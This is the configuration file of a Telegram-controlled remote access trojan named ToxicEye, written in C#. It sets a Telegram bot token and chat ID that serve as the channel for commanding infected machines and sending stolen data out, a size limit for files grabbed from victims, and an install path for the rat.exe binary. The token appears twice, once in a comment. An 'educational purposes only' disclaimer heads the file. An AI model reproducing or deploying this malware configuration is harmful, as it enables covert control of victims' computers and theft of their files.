/* 
       ^ Author    : LimerBoy
       ^ Name      : ToxicEye-RAT
       ^ Github    : https:github.com/LimerBoy

       > This program is distributed for educational purposes only.
*/


namespace TelegramRAT
{
    internal sealed class config
    {
        //5691131562:AAE3Lak9ne6Kq_j2hhmbrRCUf8caSYE7kUI
        
        // Telegram settings.
        public const string TelegramToken = "5691131562:AAE3Lak9ne6Kq_j2hhmbrRCUf8caSYE7kUI";
        public const string TelegramChatID = "1882674070";
        public static int TelegramCommandCheckDelay = 1;
        
        // Maximum file size to grab (in bytes).
        public static long GrabFileSize = 6291456;

        public static string InstallPath = @"C:\Users\ToxicEye\rat.exe";

    }
}
